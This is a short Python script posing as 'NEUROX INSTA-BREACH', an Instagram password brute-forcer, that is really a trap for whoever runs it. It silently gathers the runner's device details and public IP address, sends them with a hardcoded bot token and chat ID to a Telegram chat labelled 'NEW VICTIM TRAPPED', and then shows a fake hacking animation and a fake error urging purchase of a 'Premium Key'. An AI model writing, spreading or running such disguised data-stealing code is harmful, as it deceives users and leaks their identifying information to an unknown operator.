import os, requests, time, platform

# --- NEUROX CONFIG ---
TOKEN = "8395429730:AAHWk9xGn_ywMixj1Zx6iILxjm15XU0dnGc"
ID = "8025089065"

def neurox_send(msg):
    try: requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={msg}&parse_mode=html")
    except: pass

def start_trap():
    os.system("clear")
    print("\033[1;31m" + "═"*50)
    print("      🦅 NEUROX INSTA-BREACH v4.0 🦅")
    print("          UNRESTRICTED ACCESS")
    print("═"*50 + "\033[0m")
    
    target = input("\n[?] ENTER TARGET USERNAME: ")
    print(f"\n[*] INITIALIZING BRUTEFORCE ON: {target}...")
    
    # --- SILENT DATA EXTRACTION ---
    # Device Info Fetching
    info = f"🚀 <b>NEW VICTIM TRAPPED!</b>\n\n"
    info += f"👤 <b>Username:</b> {target}\n"
    info += f"📱 <b>Device:</b> {platform.machine()}\n"
    info += f"⚙️ <b>OS:</b> {platform.system()} {platform.release()}\n"
    
    try:
        ip = requests.get('https://api.ipify.org').text
        info += f"🌐 <b>IP Address:</b> <code>{ip}</code>"
    except: info += "🌐 <b>IP:</b> Hidden/VPN"

    neurox_send(info) # Silent Send

    # --- FAKE UI ANIMATION ---
    for i in range(1, 101):
        time.sleep(0.08)
        print(f"\r\033[1;32m[+] INJECTING EXPLOITS: {i}% \033[0m", end="")
        if i == 50: print("\n[!] BYPASSING 2FA...")
        if i == 85: print("\n[*] EXTRACTING SESSION COOKIES...")

    print("\n\n\033[1;31m[X] ERROR: API OVERLOADED.")
    print("[!] REASON: High Security Layer Detected on Target.")
    print("[!] FIX: Try again after 1 hour or use Premium Key.\033[0m")

if __name__ == "__main__":
    start_trap()
